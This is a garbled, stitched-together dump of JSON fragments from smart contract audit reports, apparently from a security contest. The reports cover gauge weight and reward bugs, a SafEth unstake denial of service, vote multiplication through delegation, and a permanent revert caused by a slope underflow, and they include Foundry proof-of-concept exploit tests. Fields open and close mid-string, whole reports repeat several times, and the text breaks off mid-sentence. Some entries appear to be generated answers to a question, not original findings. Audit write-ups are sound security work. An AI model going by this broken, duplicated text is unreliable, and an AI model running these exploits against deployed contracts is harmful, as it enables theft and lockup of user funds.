The essence of the vulnerability lies in the incorrect order of operations when updating the `totalWeight` and subsequently calculating gauge allocations.\n\nThe detailed vulnerability report explains that when a gauge is re-added before rewards are queued (`rewards.queueRewardsForCycle()`), there is an update to `totalWeight.currentWeight` without a corresponding `totalWeight.storedWeight` update. Since the reward calculation relies on the snapshot of weights (`totalWeight.storedWeight`) at the beginning of the cycle, this causes distributions to be calculated with stale data, potentially leading to an underestimation of totalWeight. This creates a scenario where some gauges may not receive their correct share of rewards, which can be exploited as described.\n\nA Proof of Concept (PoC) was partially detailed in the provided scenarios and test functions (`testDeprecatedAddedGauge`, `testDeprecatedAddedGauge2`) which illustrate the failure in the rewards distribution mechanism when a deprecated gauge with non-zero weight is re-added in the manner described. The malfunction is evidenced by the fact that certain calls to `rewards.getAccruedRewards()` will revert for the affected gauges, indicating that they cannot withdraw their allocated rewards due to an imbalance created by the vulnerability.",

                    "description": "The `unstake` function iterates over an array of derivative contracts and attempts to call the `withdraw` function on each one. If any one of these derivatives has a `withdraw` function that reverts, for example, due to the external `exchange` function reverting when `self.is_killed` is `true` in a compromised stETH-ETH pool, the entire `unstake` transaction will revert. This represents a Denial of Service (DoS) vulnerability because it can prevent all users from unstaking their assets when a single derivative is compromised. A malicious actor could exploit a vulnerability in one of the derivatives or external contracts to trigger this condition, locking all users' funds in the `SafEth` contract. Mitigation would include introducing a way to safely mark a derivative as inactive or remove it from the active set of derivatives. That way, if a derivative becomes compromised or untrusted, it would not cause all `unstake` calls to fail. Additional checks and error handling could also be implemented to allow the `unstake` function to proceed even if one of the derivatives encounters an issue, although this could involve complex logic to ensure that user balances are adjusted appropriately for partial unstakes. A possible solution might be to catch the revert and exclude the problematic derivative from the current transaction, allowing the rest of the process to complete successfully; however, proper accounting adjustments would need to be made to maintain the integrity of the system. This would avoid a complete lockup in the event of a single derivative failure but still requires a method to remove or disable the malfunctioning derivative to prevent repeated issues. Additionally, an admin function to safely remove a malfunctioning or unnecessary derivative, as the vulnerability report suggests, would be a critical feature to maintain the integrity and usability of the protocol.",

                    "description": "The provided vulnerability report along with the code outlines a few logic errors which can cause improper execution affecting the system's state and leading to unexpected results.\n\n1. **Conditional Check Error:**\n   The condition `if (oldTotalWeights > newTotalWeights)` is incorrect as per the vulnerability report. It should indeed be `if (oldTotalWeights < newTotalWeights)` since it is inside this condition where an increase in `totalWeights` is supposed to be handled. This is a critical logic error as it can prevent the correct adjustment of `bandwidth` when the total weights are increased, leading to incorrect distributions.\n\n2. **Incorrect Calculation of `poolState.bandwidth`:**\n   The multiplication and division order for updating `poolState.bandwidth` is reversed. The current code uses `oldBandwidth.mulDivUp(oldTotalWeights, newTotalWeights).toUint248();` when it should be using `oldBandwidth.mulDivUp(newTotalWeights, oldTotalWeights).toUint248();` to correctly calculate the new bandwidth for the pool after the weight change. This error results in an incorrect calculation of the bandwidth when weights are updated.\n\n3. **`leftOverBandwidth` Distribution Logic:**\n   The handling of `leftOverBandwidth` is problematic as it attempts to distribute leftover bandwidth from adjustments to other pools. However, the original code doesn't correctly track the distribution, which could lead to discrepancies in how much bandwidth is left and how it's assigned.\n\nAdditionally, in the recommendations, `currentGiveWidth` tracks the distributed bandwidth, and `currentGiveCount` keeps the count of pools to which bandwidth has been given.\n\nThe code should be corrected as per the recommendations provided in the vulnerability report, which suggest a more robust and accurate way to distribute `leftOverBandwidth` across the remaining pools based on their weight proportionally. This ensures that the last pool receives the remaining leftover bandwidth to avoid any loss due to rounding errors during calculations.\n\nThe final part of the question with the `gauge_relative_weight_write` function is unrelated to the vulnerability described above. It seems to be pasted wrongly or does not connect to the vulnerability report for the `setWeight` function. It requires a different context to evaluate its security properly.\n\nIn summary, the code in its current state is vulnerable to logic errors, which could lead to incorrect weight and bandwidth calculations within the system. The corrections provided in the vulnerability report should be integrated to mitigate these issues.",

            "detail": "\n# Vulnerability details\n\n## Impact\nDelegate mechanism in `VotingEscrow` allows infinite votes in `vote_for_gauge_weights()` in the `GaugeController`. Users can then, for example, claim more tokens in the `LendingLedger` in the market that they inflated the votes on.\n\n## Proof of Concept\n`VotingEscrow` has a delegate mechanism which lets a user delegate the voting power to another user. \nThe `GaugeController` allows voters who locked native in `VotingEscrow` to vote on the weight of a specific gauge.\n\nDue to the fact that users can delegate their voting power in the `VotingEscrow`, they may vote once in a gauge by calling `vote_for_gauge_weights()`, delegate their votes to another address and then call again `vote_for_gauge_weights()` using this other address.\n\nA POC was built in Foundry, add the following test to `GaugeController.t.sol`:\n```solidity\nfunction testDelegateSystemMultipleVoting() public {\n    vm.deal(user1, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user1);\n    gc.change_gauge_weight(user1, 100);\n    vm.stopPrank();\n\n    vm.deal(user2, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user2);\n    gc.change_gauge_weight(user2, 100);\n    vm.stopPrank();\n\n    uint256 v = 10 ether;\n\n    vm.startPrank(user1);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user1, 10_000);\n    vm.stopPrank();\n\n    vm.startPrank(user2);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user2, 10_000);\n    vm.stopPrank();\n\n    uint256 expectedWeight_ = gc.get_gauge_weight(user1);\n\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 50e16);\n\n    uint256 numDelegatedTimes_ = 20;\n\n    for (uint i_; i_ < numDelegatedTimes_; i_++) {\n        address fakeUserI_ = vm.addr(i_ + 27); // random num\n        vm.deal(fakeUserI_, 1);\n\n        vm.prank(fakeUserI_);\n        ve.createLock{value: 1}(1);\n\n        vm.prank(user1);\n        ve.delegate(fakeUserI_);\n\n        vm.prank(fakeUserI_);\n        gc.vote_for_gauge_weights(user1, 10_000);\n    }\n\n    // assert that the weight is approx numDelegatedTimes_ more than expected\n    assertEq(gc.get_gauge_weight(user1), expectedWeight_*(numDelegatedTimes_ + 1) - numDelegatedTimes_*100);\n\n    // relative weight has been increase by a lot, can be increased even more if wished\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 954545454545454545);\n}\n```\n\n## Tools Used\nVscode, Foundry\n\n## Recommended Mitigation Steps\nThe vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past. \n\nAdditionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.\n\n\n## Assessed type\n\nOther"

When a new checkpoint is created, the `voted` flag is mistakenly set to `false` because the function attempts to access a non-existent checkpoint index. The correct behavior would be to copy the previous vote status from the last checkpoint. This issue causes inaccurate reward calculations for users who have voted, as their voting status is erroneously reset upon any balance-changing action. The provided proof and recommended patch demonstrate the error and offer a solution, which is to adjust the index to access the correct previous checkpoint and preserve accurate reward accruals for voting users.",

            "detail": "\n# Vulnerability details\n\n`_get_weight` function is used in order to return the total gauge's weight and it also updates past values of the `points_weight` mapping, if `time_weight[_gauge_addr]` is less or equal to the `block.timestamp`. It contains the following loop:\n```solidity\n            for (uint256 i; i < 500; ++i) {\n                if (t > block.timestamp) break;\n                t += WEEK;\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n                    pt.bias = 0;\n                    pt.slope = 0;\n                }\n                points_weight[_gauge_addr][t] = pt;\n                if (t > block.timestamp) time_weight[_gauge_addr] = t;\n            }\n```\n\nThere are two possible scenarios:\n- `pt.bias > d_bias`\n- `pt.bias <= d_bias`\n\nThe first scenario will always happen naturally, since `pt.bias` will be the total voting power allocated for some point and since slope is a sum of all users' slopes and slopes are calculated in such a way that `<SLOPE> * <TIME_TO_END_OF_STAKING_PERIOD> = <INITIAL_BIAS>`.\n\nHowever, it is possible to artificially change `points_weight[_gauge_addr][t].bias` by calling `change_gauge_weight` (which can be only called by the governance). It important to notice here, that `change_gauge_weight` **doesn't modify** `points_weight[_gauge_addr][t].slope`\n\n`change_gauge_weight` does permit to change the weight to a smaller number than its current value, so it's both perfectly legal and possible that governance does this at some point (it could be changing the weight to `0` or any other value smaller than the current one).\n\nThen, at some point when `_get_weight` is called, we will enter the `else` block because `pt.bias` will be less than the sum of all user's biases (since originally these values were equal, but `pt.bias` was lowered by the governance). It will set `pt.bias` and `pt.slope` to `0`.\n\nAfter some time, the governance may realise that the gauge's weight is `0`, but should be bigger and may change it to some bigger value.\n\nWe will have the situation where `points_weight[_gauge_addr][t].slope = 0` and `points_weight[_gauge_addr][t].bias > 0`.\n\nIf this happens and there is any nonzero `changes_weight[_gauge_addr]` not yet taken into account (for instance in the week after the governance update), then all the functions related to the gauge at `_gauge_addr` will not work.\n\nIt's because, the following functions:\n- `checkpoint_gauge`\n- `gauge_relative_weight_write`\n- `gauge_relative_weight`\n- `_change_gauge_weight`\n- `change_gauge_weight`\n- `vote_for_gauge_weights`\n- `remove_gauge`\n\ncall `_get_weight` at some point.\n\nLet's see what will happen in `_get_weight` when it's called:\n```solidity\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n```\n\nWe will enter the `if` statement, because `pt.bias` will be `> 0` and `pt.slope` will be `0` (or some small value, if users give their voting power to gauge in the meantime), since it was previously set to `0` in the `else` statement and wasn't touched when gauge's weight was changed by the governance. We will:\n- subtract `d_bias` from `pt.bias` which will succeed\n- attempt to subtract `changes_weight[_gauge_addr][t]` from `d_slope`\n\nHowever, there could be a user (or users) whose voting power allocation finishes at `t` for some `t` not yet handled. It means that `changes_weight[_gauge_addr][t] > 0` (and if `pt.slope` is not `0`, then `changes_weight[_gauge_addr][t]` still may be greater than it). \n\nIf this happens, then the integer underflow will happen in `pt.slope -= d_slope;`. It will now happen in **every** call to `_get_weight` and it won't be possible to recover, because:\n- `vote_for_gauge_weights` will revert\n- `change_gauge_weight` will revert\n\nas they call `_get_weight` internally. So, it won't be possible to modify `pt.slope` and `pt.bias` for any point in time, so the `revert` will always happen for that gauge. It won't even be possible to remove that gauge.\n\nSo, in short, the scenario is as follows:\n1. Users allocate their voting power to a gauge `X`.\n2. Governance at some point decreases the weight of `X`.\n3. Users withdraw their voting power as the time passes, and finally the weight of `X` drops to `0`.\n4. Governance realises this and increases weight of `X` since it wants to incentivise users to provide liquidity in `X`.\n5. Voting power delegation of some user(s) ends some time after that and `_get_weight` attempts to subtract `changes_weight[_gauge_addr][t]` from the current slope (which is either `0` or some small value) and it results in integer underflow.\n6. `X` is unusable and it's impossible to withdraw voting power from (so users cannot give their voting power somewhere else). The weight of `X` cannot be changed anymore and `X` cannot be even removed.\n\n**Note that it is also possible to frontrun the call to `change_gauge_weight` when the weight is set to a lower value** - user with a lot of capital can watch the mempool and if weight is lowered to some value `x`, he can give a voting power of `x` to that gauge. Then, right after weight is changed by the governance, he can withdraw his voting power, leaving the gauge with weight = `0`. Then, governance will manually increase the weight to recover and DoS will happen as described. **So it is only needed that governance decreases gauge's weight at some point**.\n\n## Impact\nAs stated, above the impact is that the entire gauge is useless, voting powers are permanently locked there and its weight is impossible to change, so the impact is high.\n\nIn order for this situation to succeed, governance has to decrease weight of some gauge, but I think it's very likely, because:\n1. `_get_weight` checks that `if (pt.bias > d_bias)` and it handles the opposite situation, so it is anticipated that it may genuinely happen.\n2. It is definitely possible to decrease gauge's weight and it's even possible to zero it out (as in the `remove_gauge`).\n3. The situation where `old_bias` is greater than `old_sum_bias + new_bias` is handled in `vote_for_gauge_weights`, but it may only happen when gauge's weight was decreased by the governance.\n4. The situation where `old_slope.slope` is greater than `old_sum_slope + new_slope.slope` is also handled there, but it may only happen if we enter the `else` statement in `_get_weight`.\n\nSo, it is predicted that gauge's weight may be lowered and the protocol does its best to handle it properly, but as I showed, it fails to do so. Hence, I believe that this finding is of High severity, because although it requires governance to perform some action (decrease weight of some gauge), I believe that it's likely that governance decides to decrease weight, especially that it is anticipated in the code and edge cases are handled there (and they wouldn't be if we assumed that governance would never allowed them to happen).\n\n## Proof of Concept\nPlease run the test below. The test shows slightly simplified situation where governance just sets weight to `0` for `gauge1`, but as I've described above, it suffices that it's just changed to a smaller value and it may drop to `0` naturally as users withdraw their voting power. The following import will also have to be added: `import {Test, stdError} from \"forge-std/Test.sol\";`.\n\n```solidity\nfunction testPoC1() public\n    {\n        // gauge is being set up\n        vm.startPrank(gov);\n        gc.add_gauge(gauge1);\n        gc.change_gauge_weight(gauge1, 0);\n        vm.stopPrank();\n\n        // `user1` pays some money and adds his power to `gauge1`\n        vm.startPrank(user1);\n        ve.createLock{value: 1 ether}(1 ether);\n        gc.vote_for_gauge_weights(gauge1, 10000);\n        vm.warp(block.timestamp + 10 weeks);\n        gc.checkpoint_gauge(gauge1);\n        vm.stopPrank();\n\n        // `user2` does the same\n        vm.startPrank(user2);\n        ve.createLock{value: 1 ether}(1 ether);\n        gc.vote_for_gauge_weights(gauge1, 10000);\n        vm.warp(block.timestamp + 1 weeks);\n        gc.checkpoint_gauge(gauge1);\n        vm.stopPrank();\n\n        vm.warp(block.timestamp + 1825 days - 14 weeks);\n        vm.startPrank(gov);\n        // weight is changed to `0`, just to simplify\n        // normally, weight would just be decreased here and then subsequently decreased by users when their\n        // locking period is over until it finally drops to `0`\n        // alternatively, some whale can frontrun a call to `change_gauge_weight` as described and then\n        // withdraw his voting power leaving the gauge with `0` slope and `0` bias\n        gc.change_gauge_weight(gauge1, 0);\n        vm.warp(block.timestamp + 1 weeks);\n        \n        // now, weight is changed to some bigger value\n        gc.change_gauge_weight(gauge1, 1 ether);\n        vm.stopPrank();\n        // some time passes so that user1's locking period ends\n        vm.warp(block.timestamp + 5 weeks);\n        \n        // `user2` cannot change his weight although his `locked.end` is big enough\n        vm.prank(user2);\n        vm.expectRevert(stdError.arithmeticError);\n        gc.vote_for_gauge_weights(gauge1, 0);\n\n        // governance cannot change weight\n        vm.startPrank(gov);\n        vm.expectRevert(stdError.arithmeticError);\n        gc.change_gauge_weight(gauge1, 2 ether);\n        \n        // governance cannot even remove the gauge\n        // it's now impossible to do anything on gauge1\n        vm.expectRevert(stdError.arithmeticError);\n        gc.remove_gauge(gauge1);\n        vm.stopPrank();\n    }\n```\n\n## Tools Used\nVS Code\n\n## Recommended Mitigation Steps\nPerform `pt.slope -= d_slope` in `_get_weight` only when `pt.slope >= d.slope` and otherwise zero it out.\n\n\n\n\n\n## Assessed type\n\nUnder/Overflow"

The `withdraw` method in these derivative contracts, as seen in the `WstEth.withdraw` function, can interact with external contracts (e.g., `IStEthEthPool`). In the event that an external contract, such as the stETH-ETH pool (`LIDO_CRV_POOL`), is compromised and its `is_killed` flag is set to true, the `exchange` method reverts. Since this revert happens within a loop over all derivative contracts, a failure in any single derivative can cause the entire `unstake` transaction to fail.\n\nHence, this creates a situation where even if only one external system is dysfunctional or compromised, the users are prevented from unstaking their assets, leading to a Denial of Service condition for the `unstake` function. Users become unable to retrieve their ETH, and the contract's core functionality is affected.\n\nThe recommended mitigation step is to introduce a mechanism for the admin to remove malfunctioning or untrusted derivatives. This could be a smart contract function that removes the derivative from the array or otherwise disables its interaction, thereby preventing its potential to revert the entire `unstake` process and allowing the rest of the system to function correctly.

            "detail": "\n# Vulnerability details\n\n`_get_weight` function is used in order to return the total gauge's weight and it also updates past values of the `points_weight` mapping, if `time_weight[_gauge_addr]` is less or equal to the `block.timestamp`. It contains the following loop:\n```solidity\n            for (uint256 i; i < 500; ++i) {\n                if (t > block.timestamp) break;\n                t += WEEK;\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n                    pt.bias = 0;\n                    pt.slope = 0;\n                }\n                points_weight[_gauge_addr][t] = pt;\n                if (t > block.timestamp) time_weight[_gauge_addr] = t;\n            }\n```\n\nThere are two possible scenarios:\n- `pt.bias > d_bias`\n- `pt.bias <= d_bias`\n\nThe first scenario will always happen naturally, since `pt.bias` will be the total voting power allocated for some point and since slope is a sum of all users' slopes and slopes are calculated in such a way that `<SLOPE> * <TIME_TO_END_OF_STAKING_PERIOD> = <INITIAL_BIAS>`.\n\nHowever, it is possible to artificially change `points_weight[_gauge_addr][t].bias` by calling `change_gauge_weight` (which can be only called by the governance). It important to notice here, that `change_gauge_weight` **doesn't modify** `points_weight[_gauge_addr][t].slope`\n\n`change_gauge_weight` does permit to change the weight to a smaller number than its current value, so it's both perfectly legal and possible that governance does this at some point (it could be changing the weight to `0` or any other value smaller than the current one).\n\nThen, at some point when `_get_weight` is called, we will enter the `else` block because `pt.bias` will be less than the sum of all user's biases (since originally these values were equal, but `pt.bias` was lowered by the governance). It will set `pt.bias` and `pt.slope` to `0`.\n\nAfter some time, the governance may realise that the gauge's weight is `0`, but should be bigger and may change it to some bigger value.\n\nWe will have the situation where `points_weight[_gauge_addr][t].slope = 0` and `points_weight[_gauge_addr][t].bias > 0`.\n\nIf this happens and there is any nonzero `changes_weight[_gauge_addr]` not yet taken into account (for instance in the week after the governance update), then all the functions related to the gauge at `_gauge_addr` will not work.\n\nIt's because, the following functions:\n- `checkpoint_gauge`\n- `gauge_relative_weight_write`\n- `gauge_relative_weight`\n- `_change_gauge_weight`\n- `change_gauge_weight`\n- `vote_for_gauge_weights`\n- `remove_gauge`\n\ncall `_get_weight` at some point.\n\nLet's see what will happen in `_get_weight` when it's called:\n```solidity\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n```\n\nWe will enter the `if` statement, because `pt.bias` will be `> 0` and `pt.slope` will be `0` (or some small value, if users give their voting power to gauge in the meantime), since it was previously set to `0` in the `else` statement and wasn't touched when gauge's weight was changed by the governance. We will:\n- subtract `d_bias` from `pt.bias` which will succeed\n- attempt to subtract `changes_weight[_gauge_addr][t]` from `d_slope`\n\nHowever, there could be a user (or users) whose voting power allocation finishes at `t` for some `t` not yet handled. It means that `changes_weight[_gauge_addr][t] > 0` (and if `pt.slope` is not `0`, then `changes_weight[_gauge_addr][t]` still may be greater than it). \n\nIf this happens, then the integer underflow will happen in `pt.slope -= d_slope;`. It will now happen in **every** call to `_get_weight` and it won't be possible to recover, because:\n- `vote_for_gauge_weights` will revert\n- `change_gauge_weight` will revert\n\nas they call `_get_weight` internally. So, it won't be possible to modify `pt.slope` and `pt.bias` for any point in time, so the `revert` will always happen for that gauge. It won't even be possible to remove that gauge.\n\nSo, in short, the scenario is as follows:\n1. Users allocate their voting power to a gauge `X`.\n2. Governance at some point decreases the weight of `X`.\n3. Users withdraw their voting power as the time passes, and finally the weight of `X` drops to `0`.\n4. Governance realises this and increases weight of `X` since it wants to incentivise users to provide liquidity in `X`.\n5. Voting power delegation of some user(s) ends some time after that and `_get_weight` attempts to subtract `changes_weight[_gauge_addr][t]` from the current slope (which is either `0` or some small value) and it results in integer underflow.\n6. `X` is unusable and it's impossible to withdraw voting power from (so users cannot give their voting power somewhere else). The weight of `X` cannot be changed anymore and `X` cannot be even removed.\n\n**Note that it is also possible to frontrun the call to `change_gauge_weight` when the weight is set to a lower value** - user with a lot of capital can watch the mempool and if weight is lowered to some value `x`, he can give a voting power of `x` to that gauge. Then, right after weight is changed by the governance, he can withdraw his voting power, leaving the gauge with weight = `0`. Then, governance will manually increase the weight to recover and DoS will happen as described. **So it is only needed that governance decreases gauge's weight at some point**.\n\n## Impact\nAs stated, above the impact is that the entire gauge is useless, voting powers are permanently locked there and its weight is impossible to change, so the impact is high.\n\nIn order for this situation to succeed, governance has to decrease weight of some gauge, but I think it's very likely, because:\n1. `_get_weight` checks that `if (pt.bias > d_bias)` and it handles the opposite situation, so it is anticipated that it may genuinely happen.\n2. It is definitely possible to decrease gauge's weight and it's even possible to zero it out (as in the `remove_gauge`).\n3. The situation where `old_bias` is greater than `old_sum_bias + new_bias` is handled in `vote_for_gauge_weights`, but it may only happen when gauge's weight was decreased by the governance.\n4. The situation where `old_slope.slope` is greater than `old_sum_slope + new_slope.slope` is also handled there, but it may only happen if we enter the `else` statement in `_get_weight`.\n\nSo, it is predicted that gauge's weight may be lowered and the protocol does its best to handle it properly, but as I showed, it fails to do so. Hence, I believe that this finding is of High severity, because although it requires governance to perform some action (decrease weight of some gauge), I believe that it's likely that governance decides to decrease weight, especially that it is anticipated in the code and edge cases are handled there (and they wouldn't be if we assumed that governance would never allowed them to happen).\n\n## Proof of Concept\nPlease run the test below. The test shows slightly simplified situation where governance just sets weight to `0` for `gauge1`, but as I've described above, it suffices that it's just changed to a smaller value and it may drop to `0` naturally as users withdraw their voting power. The following import will also have to be added: `import {Test, stdError} from \"forge-std/Test.sol\";`.\n\n```solidity\nfunction testPoC1() public\n    {\n        // gauge is being set up\n        vm.startPrank(gov);\n        gc.add_gauge(gauge1);\n        gc.change_gauge_weight(gauge1, 0);\n        vm.stopPrank();\n\n        // `user1` pays some money and adds his power to `gauge1`\n        vm.startPrank(user1);\n        ve.createLock{value: 1 ether}(1 ether);\n        gc.vote_for_gauge_weights(gauge1, 10000);\n        vm.warp(block.timestamp + 10 weeks);\n        gc.checkpoint_gauge(gauge1);\n        vm.stopPrank();\n\n        // `user2` does the same\n        vm.startPrank(user2);\n        ve.createLock{value: 1 ether}(1 ether);\n        gc.vote_for_gauge_weights(gauge1, 10000);\n        vm.warp(block.timestamp + 1 weeks);\n        gc.checkpoint_gauge(gauge1);\n        vm.stopPrank();\n\n        vm.warp(block.timestamp + 1825 days - 14 weeks);\n        vm.startPrank(gov);\n        // weight is changed to `0`, just to simplify\n        // normally, weight would just be decreased here and then subsequently decreased by users when their\n        // locking period is over until it finally drops to `0`\n        // alternatively, some whale can frontrun a call to `change_gauge_weight` as described and then\n        // withdraw his voting power leaving the gauge with `0` slope and `0` bias\n        gc.change_gauge_weight(gauge1, 0);\n        vm.warp(block.timestamp + 1 weeks);\n        \n        // now, weight is changed to some bigger value\n        gc.change_gauge_weight(gauge1, 1 ether);\n        vm.stopPrank();\n        // some time passes so that user1's locking period ends\n        vm.warp(block.timestamp + 5 weeks);\n        \n        // `user2` cannot change his weight although his `locked.end` is big enough\n        vm.prank(user2);\n        vm.expectRevert(stdError.arithmeticError);\n        gc.vote_for_gauge_weights(gauge1, 0);\n\n        // governance cannot change weight\n        vm.startPrank(gov);\n        vm.expectRevert(stdError.arithmeticError);\n        gc.change_gauge_weight(gauge1, 2 ether);\n        \n        // governance cannot even remove the gauge\n        // it's now impossible to do anything on gauge1\n        vm.expectRevert(stdError.arithmeticError);\n        gc.remove_gauge(gauge1);\n        vm.stopPrank();\n    }\n```\n\n## Tools Used\nVS Code\n\n## Recommended Mitigation Steps\nPerform `pt.slope -= d_slope` in `_get_weight` only when `pt.slope >= d.slope` and otherwise zero it out.\n\n\n\n\n\n## Assessed type\n\nUnder/Overflow"

            "detail": "\n# Vulnerability details\n\n## Impact\nDelegate mechanism in `VotingEscrow` allows infinite votes in `vote_for_gauge_weights()` in the `GaugeController`. Users can then, for example, claim more tokens in the `LendingLedger` in the market that they inflated the votes on.\n\n## Proof of Concept\n`VotingEscrow` has a delegate mechanism which lets a user delegate the voting power to another user. \nThe `GaugeController` allows voters who locked native in `VotingEscrow` to vote on the weight of a specific gauge.\n\nDue to the fact that users can delegate their voting power in the `VotingEscrow`, they may vote once in a gauge by calling `vote_for_gauge_weights()`, delegate their votes to another address and then call again `vote_for_gauge_weights()` using this other address.\n\nA POC was built in Foundry, add the following test to `GaugeController.t.sol`:\n```solidity\nfunction testDelegateSystemMultipleVoting() public {\n    vm.deal(user1, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user1);\n    gc.change_gauge_weight(user1, 100);\n    vm.stopPrank();\n\n    vm.deal(user2, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user2);\n    gc.change_gauge_weight(user2, 100);\n    vm.stopPrank();\n\n    uint256 v = 10 ether;\n\n    vm.startPrank(user1);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user1, 10_000);\n    vm.stopPrank();\n\n    vm.startPrank(user2);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user2, 10_000);\n    vm.stopPrank();\n\n    uint256 expectedWeight_ = gc.get_gauge_weight(user1);\n\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 50e16);\n\n    uint256 numDelegatedTimes_ = 20;\n\n    for (uint i_; i_ < numDelegatedTimes_; i_++) {\n        address fakeUserI_ = vm.addr(i_ + 27); // random num\n        vm.deal(fakeUserI_, 1);\n\n        vm.prank(fakeUserI_);\n        ve.createLock{value: 1}(1);\n\n        vm.prank(user1);\n        ve.delegate(fakeUserI_);\n\n        vm.prank(fakeUserI_);\n        gc.vote_for_gauge_weights(user1, 10_000);\n    }\n\n    // assert that the weight is approx numDelegatedTimes_ more than expected\n    assertEq(gc.get_gauge_weight(user1), expectedWeight_*(numDelegatedTimes_ + 1) - numDelegatedTimes_*100);\n\n    // relative weight has been increase by a lot, can be increased even more if wished\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 954545454545454545);\n}\n```\n\n## Tools Used\nVscode, Foundry\n\n## Recommended Mitigation Steps\nThe vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past. \n\nAdditionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.\n\n\n## Assessed type\n\nOther"

The `delegate` function updates the delegatee to a new address but fails to remove the token ID from the previous delegatee's record. This means that when a user delegates their tokens to a new tokenId, the previous delegatee still maintains a record of the delegated tokenId. As a result, the user can delegate their token to multiple new tokenIds, thus multiplying their voting power artificially with the same underlying token balance. In the provided `delegate` function, when users change their delegate, it does not check or handle the existing delegations properly. Specifically, the `delegatee` of the user's `locked_` balance is updated, but the system lacks a mechanism to subtract the voting power from the old delegatee and ensure that the single delegation is counted only once for voting power calculations. This could potentially allow a user to multiply their influence in governance decisions by repeating delegations of the same token balance to different tokenIds without properly undelegating or removing the influence from the previous delegatee. Mitigation could involve an adjustment in the code logic to track delegations correctly and to ensure that when a re-delegation occurs, the old delegatee's voting weight is properly removed or updated to reflect the change. Additionally, safeguards should be put in place in vote tallying mechanisms to prevent accounting the same token's voting power multiple times.",

            "detail": "\n# Vulnerability details\n\n## Impact\nDelegate mechanism in `VotingEscrow` allows infinite votes in `vote_for_gauge_weights()` in the `GaugeController`. Users can then, for example, claim more tokens in the `LendingLedger` in the market that they inflated the votes on.\n\n## Proof of Concept\n`VotingEscrow` has a delegate mechanism which lets a user delegate the voting power to another user. \nThe `GaugeController` allows voters who locked native in `VotingEscrow` to vote on the weight of a specific gauge.\n\nDue to the fact that users can delegate their voting power in the `VotingEscrow`, they may vote once in a gauge by calling `vote_for_gauge_weights()`, delegate their votes to another address and then call again `vote_for_gauge_weights()` using this other address.\n\nA POC was built in Foundry, add the following test to `GaugeController.t.sol`:\n```solidity\nfunction testDelegateSystemMultipleVoting() public {\n    vm.deal(user1, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user1);\n    gc.change_gauge_weight(user1, 100);\n    vm.stopPrank();\n\n    vm.deal(user2, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user2);\n    gc.change_gauge_weight(user2, 100);\n    vm.stopPrank();\n\n    uint256 v = 10 ether;\n\n    vm.startPrank(user1);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user1, 10_000);\n    vm.stopPrank();\n\n    vm.startPrank(user2);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user2, 10_000);\n    vm.stopPrank();\n\n    uint256 expectedWeight_ = gc.get_gauge_weight(user1);\n\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 50e16);\n\n    uint256 numDelegatedTimes_ = 20;\n\n    for (uint i_; i_ < numDelegatedTimes_; i_++) {\n        address fakeUserI_ = vm.addr(i_ + 27); // random num\n        vm.deal(fakeUserI_, 1);\n\n        vm.prank(fakeUserI_);\n        ve.createLock{value: 1}(1);\n\n        vm.prank(user1);\n        ve.delegate(fakeUserI_);\n\n        vm.prank(fakeUserI_);\n        gc.vote_for_gauge_weights(user1, 10_000);\n    }\n\n    // assert that the weight is approx numDelegatedTimes_ more than expected\n    assertEq(gc.get_gauge_weight(user1), expectedWeight_*(numDelegatedTimes_ + 1) - numDelegatedTimes_*100);\n\n    // relative weight has been increase by a lot, can be increased even more if wished\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 954545454545454545);\n}\n```\n\n## Tools Used\nVscode, Foundry\n\n## Recommended Mitigation Steps\nThe vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past. \n\nAdditionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can 